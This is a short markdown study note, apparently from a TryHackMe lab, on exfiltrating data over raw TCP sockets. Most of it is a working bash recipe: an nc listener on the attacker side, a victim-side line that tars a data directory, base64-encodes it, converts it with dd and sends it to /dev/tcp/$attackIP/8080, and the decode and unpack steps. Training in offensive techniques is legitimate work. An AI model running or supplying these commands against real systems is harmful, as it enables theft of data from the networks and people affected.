# Data Exfiltration with - TCP Sockets

Easy to detect as reliant on non-standard protocols only useful on network with no known secruity products.

1. Attacker listening over TCP/8080
2. Client connect to TCP/8080
3. Attacker establishes the connection
4. Sending and recieving of data starts

```bash
# Attacker
nc -lvp 8080 > /tmp/exfil.data &
# Client
# Get on here some how..
tar zcf - $data_dir/ | base64 | dd conv=ebcdic > /dev/tcp/$attackIP/8080
# Attacker
dd conv=ascii if=$file | base64 -d > $file.tar
tar xvf $file.tar
```

## References

[THM Data Exfiltration](https://tryhackme.com/room/dataxexfilt)